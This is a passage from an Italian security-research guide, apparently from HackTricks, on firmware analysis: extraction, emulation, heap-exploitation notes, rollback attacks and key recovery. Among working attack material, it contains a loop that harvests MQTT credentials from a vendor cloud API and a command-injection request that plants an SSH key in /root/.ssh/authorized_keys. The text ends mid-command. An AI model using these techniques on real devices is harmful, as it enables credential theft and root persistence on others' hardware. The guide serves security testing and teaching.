# Analisi del firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Introduzione**

### Risorse correlate

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Il firmware è un software essenziale che consente ai dispositivi di funzionare correttamente, gestendo e facilitando la comunicazione tra i componenti hardware e il software con cui interagiscono gli utenti. È memorizzato in una memoria permanente, così che il dispositivo possa accedere alle istruzioni fondamentali fin dal momento dell'accensione, consentendo l'avvio del sistema operativo. Esaminare e, potenzialmente, modificare il firmware è un passaggio fondamentale per individuare vulnerabilità di sicurezza.<sup>[[2]](#references)[[3]](#references)</sup>

## **Raccolta di informazioni**

La **raccolta di informazioni** è un passaggio iniziale fondamentale per comprendere la composizione di un dispositivo e le tecnologie utilizzate. Questo processo prevede la raccolta di dati su:

- L'architettura della CPU e il sistema operativo in esecuzione
- Le specifiche del bootloader
- La disposizione dell'hardware e i datasheet
- Le metriche del codebase e le posizioni del codice sorgente
- Le librerie esterne e i tipi di licenza
- La cronologia degli aggiornamenti e le certificazioni normative
- I diagrammi architetturali e di flusso
- Le valutazioni di sicurezza e le vulnerabilità individuate

A questo scopo, gli strumenti di **open-source intelligence (OSINT)** sono preziosi, così come l'analisi di qualsiasi componente software open source disponibile, tramite processi di revisione manuali e automatizzati. Strumenti come [Coverity Scan](https://scan.coverity.com) e [LGTM di Semmle](https://lgtm.com/#explore) offrono analisi statica gratuite che possono essere utilizzate per individuare potenziali problemi.

## **Acquisizione del firmware**

È possibile ottenere il firmware in diversi modi, ciascuno con un diverso livello di complessità:

- Ottenerlo **direttamente** dalla fonte (sviluppatori, produttori)
- **Compilarlo** seguendo le istruzioni fornite
- **Scaricarlo** dai siti di supporto ufficiali
- Utilizzare query **Google dork** per trovare file firmware ospitati online
- Accedere direttamente allo **cloud storage**, con strumenti come [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Intercettare gli **aggiornamenti** con tecniche man-in-the-middle
- **Estrarlo** dal dispositivo tramite connessioni come **UART**, **JTAG** o **PICit**
- **Sniffare** le richieste di aggiornamento nelle comunicazioni del dispositivo
- Individuare e utilizzare gli **endpoint di aggiornamento hardcoded**
- Eseguire un **dump** dal bootloader o dalla rete
- **Rimuovere e leggere** il chip di memoria, se ogni altro tentativo fallisce, utilizzando gli strumenti hardware appropriati

### Log solo via UART: forzare una root shell tramite l'ambiente U-Boot nella flash

Se i dati ricevuti via UART vengono ignorati (sono disponibili solo i log), è comunque possibile forzare una shell di init **modificando offline il blob dell'ambiente U-Boot**:<sup>[[6]](#references)</sup>

1. Eseguire il dump della flash SPI con una clip SOIC-8 e un programmatore (3,3 V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Individua la partizione env di U-Boot, modifica `bootargs` per includere `init=/bin/sh` e **ricalcola il CRC32 dell'env U-Boot** per il blob.
3. Riscrivi solo la partizione env e riavvia; dovrebbe apparire una shell su UART.

È utile sui dispositivi embedded in cui la shell del bootloader è disabilitata, ma la partizione env è scrivibile tramite accesso a flash esterna.

## Analisi del firmware

Ora che **hai il firmware**, devi estrarne informazioni per capire come procedere. Ecco alcuni strumenti che puoi usare:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Se con questi strumenti non trovi molto, controlla l'**entropia** dell'immagine con `binwalk -E <bin>`: se è bassa, probabilmente non è crittografata. Se è alta, è probabile che sia crittografata (o compressa in qualche modo).

Inoltre, puoi usare questi strumenti per estrarre i **file incorporati nel firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Oppure [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) per ispezionare il file.

### Ottenere il filesystem

Con gli strumenti menzionati in precedenza, come `binwalk -ev <bin>`, dovresti essere riuscito a **estrarre il filesystem**.\
Binwalk di solito lo estrae in una **cartella denominata in base al tipo di filesystem**, che in genere è uno dei seguenti: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Estrazione manuale del filesystem

A volte, binwalk **non include il magic byte del filesystem nelle sue signature**. In questi casi, usa binwalk per **trovare l'offset del filesystem ed eseguire il carving del filesystem compresso** dal binario, quindi **estrai manualmente** il filesystem in base al suo tipo, seguendo i passaggi riportati di seguito.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Esegui il seguente **comando dd** per eseguire il carving del filesystem Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

In alternativa, è possibile eseguire anche il seguente comando.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Per squashfs (usato nell'esempio sopra)

`$ unsquashfs dir.squashfs`

Al termine, i file si troveranno nella directory "`squashfs-root`".

- File di archivio CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Per i filesystem jffs2

`$ jefferson rootfsfile.jffs2`

- Per i filesystem ubifs con flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analisi del firmware

Una volta ottenuto il firmware, è essenziale esaminarlo per comprenderne la struttura e le potenziali vulnerabilità. Questo processo prevede l'uso di vari strumenti per analizzare ed estrarre dati preziosi dall'immagine del firmware.

### Strumenti di analisi iniziale

È disponibile un insieme di comandi per l'ispezione iniziale del file binario (indicato come `<bin>`). Questi comandi aiutano a identificare i tipi di file, estrarre stringhe, analizzare i dati binari e comprendere i dettagli delle partizioni e del filesystem:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Per valutare lo stato della cifratura dell’immagine, si controlla l’**entropia** con `binwalk -E <bin>`. Una bassa entropia suggerisce l’assenza di cifratura, mentre un’elevata entropia indica una possibile cifratura o compressione.

Per estrarre i **file incorporati**, si consigliano strumenti e risorse come la documentazione **file-data-carving-recovery-tools** e **binvis.io** per l’ispezione dei file.

### Estrazione del filesystem

Con `binwalk -ev <bin>`, di solito è possibile estrarre il filesystem, spesso in una directory denominata in base al tipo di filesystem (ad es. squashfs, ubifs). Tuttavia, quando **binwalk** non riesce a riconoscere il tipo di filesystem a causa dell’assenza dei magic bytes, è necessario procedere all’estrazione manuale. Questa operazione consiste nell’usare `binwalk` per individuare l’offset del filesystem e poi il comando `dd` per estrarlo:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Successivamente, a seconda del tipo di filesystem (ad es. squashfs, cpio, jffs2, ubifs), si usano comandi diversi per estrarne manualmente i contenuti.

### Analisi del filesystem

Una volta estratto il filesystem, inizia la ricerca di falle di sicurezza. Si presta attenzione ai demoni di rete non sicuri, alle credenziali hardcoded, agli endpoint API, alle funzionalità dei server di aggiornamento, al codice non compilato, agli script di avvio e ai binari compilati da analizzare offline.

Tra le **posizioni** e gli **elementi chiave** da esaminare figurano:

- **etc/shadow** e **etc/passwd** per le credenziali degli utenti
- Certificati e chiavi SSL in **etc/ssl**
- File di configurazione e script per individuare potenziali vulnerabilità
- Binari embedded da sottoporre a ulteriori analisi
- Server web e binari comuni dei dispositivi IoT

Diversi strumenti aiutano a individuare informazioni sensibili e vulnerabilità nel filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) e [**Firmwalker**](https://github.com/craigz28/firmwalker) per la ricerca di informazioni sensibili
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) per un'analisi completa del firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) e [**EMBA**](https://github.com/e-m-b-a/emba) per l'analisi statica e dinamica

### Controlli di sicurezza sui binari compilati

È necessario esaminare attentamente le vulnerabilità sia nel codice sorgente sia nei binari compilati presenti nel filesystem. Strumenti come **checksec.sh** per i binari Unix e **PESecurity** per quelli Windows aiutano a individuare binari privi di protezioni che potrebbero essere sfruttati.

## Raccolta di configurazioni cloud e credenziali MQTT tramite token URL derivati

Molti hub IoT recuperano la configurazione specifica di ciascun dispositivo da un endpoint cloud simile a:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Durante l'analisi del firmware, potresti scoprire che `<token>` viene derivato localmente dall'ID del dispositivo usando un segreto hardcoded, ad esempio:

- token = MD5( deviceId || STATIC_KEY ) e rappresentato in esadecimale maiuscolo

Questo design permette a chiunque conosca un deviceId e la STATIC_KEY di ricostruire l'URL e recuperare la configurazione cloud, che spesso rivela credenziali MQTT in testo in chiaro e prefissi degli argomenti.

Procedura pratica:

1) Estrarre deviceId dai log di avvio UART

- Collegare un adattatore UART a 3.3V (TX/RX/GND) e acquisire i log:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Cerca le righe che stampano il pattern dell'URL di configurazione cloud e l'indirizzo del broker, ad esempio:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Recuperare STATIC_KEY e l'algoritmo del token dal firmware

- Carica i binari in Ghidra/radare2 e cerca il percorso di configurazione ("/pf/") o l'uso di MD5.
- Conferma l'algoritmo (ad es., MD5(deviceId||STATIC_KEY)).
- Ricava il token in Bash e converti il digest in maiuscolo:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Raccogliere la configurazione cloud e le credenziali MQTT

- Componi l'URL e scarica il JSON con curl; analizzalo con jq per estrarre i segreti:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Sfruttare MQTT in chiaro e ACL deboli dei topic (se presenti)

- Usa le credenziali recuperate per sottoscriverti ai topic di manutenzione e cercare eventi sensibili:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Enumerare gli ID dei dispositivi prevedibili (su larga scala, con autorizzazione)

- Molti ecosistemi incorporano byte OUI/prodotto/tipo del vendor seguiti da un suffisso sequenziale.
- Puoi iterare sugli ID candidati, derivare token e recuperare configurazioni programmaticamente:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Note
- Ottieni sempre un'autorizzazione esplicita prima di tentare un'enumerazione su larga scala.
- Quando possibile, preferisci l'emulazione o l'analisi statica per recuperare i segreti senza modificare l'hardware target.

Il processo di emulazione del firmware consente l'**analisi dinamica** del funzionamento di un dispositivo o di un singolo programma. Questo approccio può presentare difficoltà legate alle dipendenze dall'hardware o dall'architettura, ma trasferire il file system root o binari specifici su un dispositivo con architettura ed endianness corrispondenti, come un Raspberry Pi, oppure su una macchina virtuale preconfigurata, può facilitare ulteriori test.

### Emulazione di singoli binari

Per esaminare singoli programmi, è fondamentale identificare l'endianness e l'architettura della CPU del programma.

#### Esempio con architettura MIPS

Per emulare un binario per architettura MIPS, si può usare il comando:

```bash
file ./squashfs-root/bin/busybox
```

E per installare gli strumenti di emulazione necessari:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Per MIPS (big-endian) si usa `qemu-mips`, mentre per i binari little-endian si sceglie `qemu-mipsel`.

#### Emulazione dell'architettura ARM

Per i binari ARM, il processo è simile: per l'emulazione si utilizza l'emulatore `qemu-arm`.

### Emulazione dell'intero sistema

Strumenti come [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) e altri facilitano l'emulazione completa del firmware, automatizzando il processo e agevolando l'analisi dinamica.

## Analisi dinamica nella pratica

In questa fase, per l'analisi si utilizza un ambiente con dispositivo reale o emulato. È essenziale mantenere l'accesso alla shell del sistema operativo e al filesystem. L'emulazione potrebbe non riprodurre perfettamente le interazioni con l'hardware, rendendo talvolta necessario riavviarla. L'analisi dovrebbe tornare a esaminare il filesystem, sfruttare le pagine web e i servizi di rete esposti e analizzare le vulnerabilità del bootloader. I test di integrità del firmware sono fondamentali per identificare potenziali vulnerabilità dovute a backdoor.

## Tecniche di analisi runtime

L'analisi runtime consiste nell'interagire con un processo o un binario nel suo ambiente operativo, utilizzando strumenti come gdb-multiarch, Frida e Ghidra per impostare breakpoint e individuare vulnerabilità tramite fuzzing e altre tecniche.

Per i target embedded senza un debugger completo, **copia un `gdbserver` collegato staticamente** sul dispositivo e collegati da remoto:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Mappatura dei messaggi Zigbee / radio-co-processor

Negli hub IoT, lo stack RF è spesso suddiviso tra un **radio MCU** e un processo Linux in userland. Un workflow utile consiste nel mappare il percorso:<sup>[[8]](#references)</sup>

1. **Frame RF** trasmesso via radio
2. **Parser lato controller** sul radio MCU
3. **Protocollo seriale/UART testuale o TLV** inoltrato a Linux (ad esempio `/dev/tty*`)
4. **Dispatcher dell'applicazione** nel daemon principale
5. **Handler specifico del protocollo / state machine**

Questa architettura crea due target di reverse engineering invece di uno. Se il controller converte i frame radio binari in un protocollo testuale come `Group,Command,arg1,arg2,...`, ricostruisci:

- I **gruppi di messaggi** e le tabelle di dispatch
- Quali messaggi possono provenire dalla **rete** e quali dal controller stesso
- Gli esatti **campi discriminatori specifici del produttore** (ad esempio Zigbee `manufacturer_code` e `cluster_command` personalizzati)
- Quali handler sono raggiungibili solo durante le fasi di **commissioning**, discovery o download del firmware/modello

Per Zigbee in particolare, acquisisci il traffico di pairing e verifica se il target si affida ancora alla **Link Key** predefinita `ZigBeeAlliance09`. In tal caso, lo sniffing del traffico di commissioning potrebbe esporre la **Network Key**. I codici di installazione di Zigbee 3.0 riducono questa esposizione: verifica quindi se il dispositivo testato li applica davvero.

### Handler di protocollo specifici del produttore e raggiungibilità vincolata dalla FSM

I comandi Zigbee/ZCL specifici del produttore sono spesso un target migliore dei cluster standardizzati, perché alimentano **codice di parsing personalizzato** e **FSM** interne con una validazione meno collaudata.<sup>[[8]](#references)</sup>

Workflow pratico:

- Esegui il reverse engineering del dispatcher dei comandi fino a trovare l'**handler riservato al produttore**.
- Ricostruisci le tabelle di **stato FSM**, **evento**, **check**, **azione** e **stato successivo**.
- Individua gli **stati transitori** che avanzano automaticamente e i rami di retry/errore che finiscono per azzerare o liberare lo stato controllato dall'attaccante.
- Verifica quali scambi di protocollo legittimi sono necessari per portare il daemon nello stato vulnerabile, invece di presumere che l'handler vulnerabile sia sempre raggiungibile.

Per i protocolli sensibili alle tempistiche, il replay dei pacchetti da un framework Python potrebbe essere troppo lento. Un approccio più affidabile consiste nell'emulare un dispositivo legittimo su hardware reale (ad esempio un **nRF52840**) usando uno stack di livello produttore, così da esporre gli **endpoint**, gli **attributi** e le tempistiche di commissioning corretti.

### Classe di bug nei download frammentati dei daemon embedded

Una classe di bug ricorrente nel firmware riguarda i download **frammentati di blob/modelli/configurazioni**:<sup>[[8]](#references)</sup>

1. Il **primo frammento** (`offset == 0`) memorizza `ctx->total_size` e alloca `malloc(total_size)`.
2. I frammenti successivi convalidano solo i campi **locali al pacchetto** controllati dall'attaccante, come `packet_total_size >= offset + chunk_len`.
3. La copia usa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` senza verificare che rientri nella **dimensione allocata originariamente**.

Questo consente a un attaccante di inviare:

- Un primo frammento valido con una dimensione totale dichiarata **piccola**, per forzare una piccola allocazione heap.
- Un frammento successivo con l'**offset previsto**, ma un `chunk_len` maggiore.
- Una dimensione locale al pacchetto contraffatta che supera i nuovi controlli, pur causando un overflow del buffer allocato originariamente.

Quando il percorso vulnerabile è vincolato dalla logica di commissioning, l'exploitation deve includere un livello sufficiente di **emulazione del dispositivo** per portare il target nello stato previsto di download del modello o del blob prima di inviare i frammenti malformati.

### Trigger di `free()` attivati dal protocollo

Nei daemon embedded, il modo più semplice per attivare lo sfruttamento dei metadati heap spesso non è "aspettare la pulizia", ma **forzare la gestione degli errori del protocollo stesso**:<sup>[[8]](#references)</sup>

- Invia frammenti successivi malformati per portare la FSM negli stati di **retry** o **errore**.
- Supera la soglia di retry, così che il daemon **azzerri il contesto** e liberi il buffer corrotto.
- Usa questo `free()` prevedibile per attivare primitive lato allocator prima che il processo vada in crash per motivi non correlati.

È particolarmente utile contro allocator **musl/uClibc/dlmalloc-like** su Linux embedded, dove la corruzione dei metadati dei chunk può trasformare la logica unlink/unbin in una primitiva di scrittura. Un pattern stabile consiste nel corrompere un **campo size** per reindirizzare l'attraversamento dell'allocator verso **fake chunk predisposti nel buffer soggetto a overflow**, invece di sovrascrivere immediatamente puntatori di bin reali e causare un crash del processo.

## Sfruttamento binario e proof of concept

Lo sviluppo di un PoC per le vulnerabilità individuate richiede una conoscenza approfondita dell'architettura target e la programmazione in linguaggi di basso livello. Le protezioni runtime binarie sono rare nei sistemi embedded, ma, quando presenti, potrebbero essere necessarie tecniche come Return Oriented Programming (ROP).

### Note sullo sfruttamento di fastbin di uClibc (Linux embedded)

- **Fastbin e consolidamento:** uClibc usa fastbin simili a quelli di glibc. Un'allocazione grande successiva può attivare `__malloc_consolidate()`, quindi qualsiasi fake chunk deve superare i controlli (dimensione valida, `fd = 0` e chunk circostanti considerati "in uso").<sup>[[6]](#references)</sup>
- **Binari non-PIE con ASLR:** se ASLR è abilitato ma il binario principale è **non-PIE**, gli indirizzi `.data/.bss` all'interno del binario sono stabili. È possibile puntare a una regione che assomiglia già a un header valido di heap chunk per fare in modo che un'allocazione fastbin finisca su una **tabella di puntatori a funzione**.
- **NUL che interrompe il parser:** durante il parsing di JSON, un `\x00` nel payload può interrompere il parsing mantenendo i byte controllati dall'attaccante che seguono, utilizzabili per uno stack pivot/ROP chain.
- **Shellcode tramite `/proc/self/mem`:** una ROP chain che invoca `open("/proc/self/mem")`, `lseek()` e `write()` può inserire shellcode eseguibile in una mapping nota e poi saltarvi.

## Sistemi operativi preconfigurati per l'analisi del firmware

Sistemi operativi come [AttifyOS](https://github.com/adi0x90/attifyos) ed [EmbedOS](https://github.com/scriptingxss/EmbedOS) forniscono ambienti preconfigurati per i test di sicurezza del firmware, dotati degli strumenti necessari.

## Sistemi operativi preconfigurati per analizzare il firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS è una distro pensata per aiutarti a eseguire valutazioni di sicurezza e penetration testing dei dispositivi Internet of Things (IoT). Ti fa risparmiare molto tempo fornendo un ambiente preconfigurato con tutti gli strumenti necessari già installati.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): sistema operativo per i test di sicurezza embedded basato su Ubuntu 18.04 e dotato di strumenti per i test di sicurezza del firmware.

## Attacchi di downgrade del firmware e meccanismi di aggiornamento non sicuri

Anche quando un produttore implementa verifiche delle firme crittografiche per le immagini firmware, spesso **non implementa la protezione dal rollback (downgrade) della versione**. Se il bootloader o il recovery loader verifica solo la firma con una chiave pubblica incorporata, senza confrontare la *versione* (o un contatore monotono) dell'immagine da flashare, un attaccante può installare legittimamente un **firmware più vecchio e vulnerabile, ma ancora dotato di una firma valida**, reintroducendo così vulnerabilità già corrette.<sup>[[4]](#references)</sup>

Workflow tipico dell'attacco:

1. **Ottieni un'immagine firmata più vecchia**
   * Scaricala dal portale pubblico, dal CDN o dal sito di supporto del produttore.
   * Estraila dalle applicazioni mobile/desktop associate (ad esempio da `assets/firmware/` all'interno di un APK Android).
   * Recuperala da repository di terze parti come VirusTotal, archivi Internet, forum, ecc.
2. **Carica o fornisci l'immagine al dispositivo** tramite un qualsiasi canale di aggiornamento esposto:
   * Interfaccia Web, API dell'app mobile, USB, TFTP, MQTT, ecc.
   * Molti dispositivi IoT consumer espongono endpoint HTTP(S) *non autenticati* che accettano blob firmware codificati in Base64, li decodificano lato server e attivano il ripristino/aggiornamento.
3. Dopo il downgrade, sfrutta una vulnerabilità corretta in una versione più recente (ad esempio un filtro per command injection aggiunto in seguito).
4. Facoltativamente, ripristina l'immagine più recente o disattiva gli aggiornamenti per evitare di essere rilevato una volta ottenuta la persistenza.

### Esempio: command injection dopo il downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Nel firmware vulnerabile (retrocesso), il parametro `md5` viene concatenato direttamente a un comando shell senza alcuna sanitizzazione, consentendo l'iniezione di comandi arbitrari (in questo caso, abilitando l'accesso root tramite chiave SSH). Le versioni successive del firmware hanno introdotto un filtro di base per i caratteri, ma l'assenza di protezione dai downgrade rende inutile la correzione.<sup>[[4]](#references)</sup>

### Estrazione del firmware dalle app mobile

Molti vendor includono immagini firmware complete nelle proprie app mobile companion, affinché l'app possa aggiornare il dispositivo tramite Bluetooth/Wi-Fi. Questi pacchetti vengono comunemente archiviati, non crittografati, nell'APK/APEX in percorsi come `assets/fw/` o `res/raw/`. Strumenti come `apktool`, `ghidra` o anche il semplice `unzip` consentono di estrarre immagini firmate senza accedere all'hardware fisico.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Bypass anti-rollback solo nell’updater nei design con slot A/B

Alcuni vendor implementano effettivamente un **ratchet** anti-downgrade, ma solo nella logica dell’*updater* (per esempio una routine UDS su CAN, un comando di recovery o un agente OTA in userspace). Se in seguito il **bootloader** controlla solo la firma/CRC dell’immagine e si fida della tabella delle partizioni o dei metadati dello slot, è ancora possibile aggirare la protezione dal rollback.<sup>[[7]](#references)</sup>

Design debole tipico:

- I metadati del firmware contengono sia un descrittore di versione sia un **ratchet di sicurezza** / contatore monotono.
- L’updater confronta il ratchet dell’immagine con un valore memorizzato nell’archiviazione persistente e rifiuta le immagini firmate più vecchie.
- Il bootloader **non** analizza il ratchet e verifica solo header, CRC e firma prima di avviare lo slot selezionato.
- L’attivazione dello slot viene memorizzata separatamente in una tabella delle partizioni o in un contatore di generazione per slot e **non è associata crittograficamente** all’hash esatto del firmware convalidato.

Questo crea una primitiva **convalida un’immagine / avviane un’altra** nei sistemi a doppio slot. Se l’attaccante può fare in modo che l’updater imposti lo slot B come destinazione del prossimo avvio usando un’immagine firmata attuale e poi sovrascrivere lo slot B prima del riavvio, il bootloader potrebbe comunque avviare l’immagine con downgrade perché si fida solo dei metadati dello slot già registrati.

Schema di abuso comune:

1. Carica un firmware **firmato attuale** nello slot passivo ed esegui la normale routine di convalida/cambio, in modo che il layout contrassegni quello slot come prossimo attivo.
2. **Non riavviare ancora**. Rientra nella routine di preparazione/cancellazione dello slot nella stessa sessione.
3. Sfrutta una logica obsoleta dello stato di avvio o della selezione dello slot, in modo che l’updater cancelli lo **stesso slot fisico** appena promosso.
4. Scrivi in quello slot un firmware **più vecchio ma ancora firmato**.
5. Salta la routine di convalida che applica il ratchet e riavvia direttamente.
6. Il bootloader seleziona lo slot promosso, verifica solo firma/integrità e avvia la vecchia immagine.

Aspetti da verificare durante il reverse engineering delle implementazioni di aggiornamento A/B:

- Selezione dello slot derivata da **flag di avvio** che non vengono aggiornati dopo un cambio riuscito.
- Una routine del tipo `prepare_passive_slot()` che cancella uno slot in base a uno stato obsoleto anziché al **layout attualmente registrato**.
- Una funzione del tipo `part_write_layout()` che incrementa solo un **contatore di generazione** / flag di attivazione e non memorizza l’hash dell’immagine convalidata.
- Controlli del ratchet implementati in userspace o nel codice dell’updater, ma **non** in ROM / bootloader / fasi di secure boot.
- Routine di cancellazione o recovery che lasciano lo slot contrassegnato come avviabile anche dopo averne rimosso e riscritto il contenuto.

### Checklist per valutare la logica di aggiornamento

* Il trasporto/autenticazione dell’*endpoint di aggiornamento* è protetto adeguatamente (TLS + autenticazione)?
* Il dispositivo confronta i **numeri di versione** o un **contatore monotono anti-rollback** prima del flashing?
* L’immagine viene verificata all’interno di una catena di secure boot (per esempio, le firme vengono controllate dal codice ROM)?
* Il **bootloader applica lo stesso ratchet** dell’updater, invece di controllare solo firma/CRC?
* I metadati di attivazione dello slot sono **associati all’hash/versione del firmware convalidato**, oppure lo slot può essere modificato dopo la promozione?
* Dopo il completamento del cambio di slot, il dispositivo è costretto a riavviarsi oppure le routine successive di aggiornamento/cancellazione sono ancora accessibili nella stessa sessione?
* Il codice userland esegue ulteriori controlli di coerenza (per esempio sulla mappa delle partizioni consentita o sul numero di modello)?
* I flussi di aggiornamento *parziali* o di *backup* riutilizzano la stessa logica di convalida?

> 💡  Se manca uno qualsiasi degli elementi sopra indicati, probabilmente la piattaforma è vulnerabile agli attacchi di rollback.

## Firmware vulnerabile per fare pratica

Per esercitarti a individuare vulnerabilità nel firmware, usa come punto di partenza i seguenti progetti di firmware vulnerabile.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Recuperare le chiavi di decrittografia del firmware dallo stato di KMS/Vault incorporato

Quando un’immagine di aggiornamento combina piccoli metadati in chiaro con un grande blob ad alta entropia, analizza prima il contenitore, prima di tentare qualsiasi brute force:<sup>[[1]](#references)</sup>

- Estrai header, offset e confini delle righe con `hexdump`, `xxd`, `strings -tx`, `base64 -d` e `binwalk -E`.
- `Salted__` di solito indica il formato OpenSSL `enc`: i successivi 8 byte sono il salt e i byte rimanenti sono il ciphertext.
- Un campo Base64 che, una volta decodificato, è lungo esattamente `256` byte è un forte indizio che si tratti di un ciphertext RSA-2048 usato per cifrare una password casuale del firmware o una chiave di sessione.
- Il materiale PGP detached nello stesso file spesso protegge solo l’autenticità; non presumere che sia il meccanismo di riservatezza.

Se la ricerca statica delle chiavi (`grep`, `strings`, ricerche PEM/PGP) non dà risultati, esegui il reverse engineering del **percorso operativo di decrittografia** invece di limitarti a cercare chiavi private:

- Decompila l’updater / il binario di gestione e traccia chi legge il blob cifrato, quale helper/API lo decifra e quale nome logico della chiave viene richiesto.
- Cerca nel filesystem root estratto lo stato di KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), oltre ai file unit e agli script di init.
- Considera i comandi `vault operator unseal ...` in chiaro, le chiavi di recovery, i token di bootstrap o gli script locali di auto-unseal di KMS come equivalenti a materiale di chiave privata.

Se l’appliance include il binario Vault originale e il backend di storage, riprodurre quell’ambiente è di solito più semplice che reimplementare gli interni di Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
